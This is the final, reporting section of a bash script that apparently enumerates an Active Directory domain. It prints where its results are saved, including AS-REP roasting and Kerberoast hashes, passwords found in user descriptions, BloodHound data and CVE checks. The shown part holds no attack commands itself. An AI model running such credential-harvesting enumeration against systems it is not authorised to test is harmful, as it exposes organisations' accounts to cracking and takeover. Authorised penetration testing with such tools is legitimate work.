echo -e "========================================${NC}\n"

echo -e "${YELLOW}[*] All results saved to: ${CYAN}$OUTPUT_DIR${NC}"
echo -e "${YELLOW}[*] Summary report: ${CYAN}$OUTPUT_DIR/ENUMERATION_REPORT.txt${NC}"
echo -e "${YELLOW}[*] Commands executed: ${CYAN}$OUTPUT_DIR/COMMANDS_EXECUTED.txt${NC}\n"

echo -e "${GREEN}Key Files to Review:${NC}"
[ -f "$OUTPUT_DIR/ENUMERATION_REPORT.txt" ] && echo -e "  - ${CYAN}ENUMERATION_REPORT.txt${NC} (Summary & findings)"
[ -f "$OUTPUT_DIR/COMMANDS_EXECUTED.txt" ] && echo -e "  - ${CYAN}COMMANDS_EXECUTED.txt${NC} (All commands run)"
[ -f "$OUTPUT_DIR/kerberos/asreproast.txt" ] && [ -s "$OUTPUT_DIR/kerberos/asreproast.txt" ] && echo -e "  - ${CYAN}kerberos/asreproast.txt${NC} (AS-REP hashes)"
[ -f "$OUTPUT_DIR/kerberos/kerberoast_hashes.txt" ] && [ -s "$OUTPUT_DIR/kerberos/kerberoast_hashes.txt" ] && echo -e "  - ${CYAN}kerberos/kerberoast_hashes.txt${NC} (TGS hashes)"
[ -f "$OUTPUT_DIR/users/users_password_desc.txt" ] && [ -s "$OUTPUT_DIR/users/users_password_desc.txt" ] && echo -e "  - ${CYAN}users/users_password_desc.txt${NC} (Passwords in description)"
[ -d "$OUTPUT_DIR/bloodhound/" ] && [ "$(ls -A $OUTPUT_DIR/bloodhound/*.zip 2>/dev/null)" ] && echo -e "  - ${CYAN}bloodhound/*.zip${NC} (BloodHound data)"
[ -d "$OUTPUT_DIR/vulnerabilities/" ] && echo -e "  - ${CYAN}vulnerabilities/${NC} (CVE checks)"

echo ""
